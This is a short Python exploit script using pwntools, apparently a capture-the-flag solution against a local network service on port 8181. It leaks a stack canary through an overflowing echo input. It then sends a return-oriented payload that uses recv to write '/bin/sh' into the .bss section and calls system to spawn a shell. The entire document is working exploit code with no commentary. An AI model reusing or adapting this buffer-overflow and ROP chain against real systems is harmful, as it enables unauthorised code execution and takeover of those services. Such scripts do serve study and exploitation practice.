from pwn import *
#context.log_level = 'debug'

r = remote('127.0.0.1', 8181)

def send_echo(data):
	r.sendline('1') 
	r.recvuntil(': ')
	r.sendline(data)

def leak_canary():
	send_echo('A'*40)
	r.recvuntil('A'*40 + '\n')
	test = u32('\x00' + r.recv(3))
	return test
	
	
canary = leak_canary()
log.info('canary : 0x%x' % canary)

recv_plt = 0x80486e0
ppppr = 0x8048eec
bss = 0x0804b1b4
cmd = '/bin/sh'
system_plt = 0x8048620

payload = 'A'*40 + p32(canary) + 'B'*12
payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(4)
payload += p32(bss)
payload += p32(len(cmd))
payload += p32(0)

payload += p32(system_plt)
payload += 'BBBB'
payload += p32(bss)


send_echo(payload)
r.recvuntil('> ')

r.sendline('3')
r.sendline(cmd)
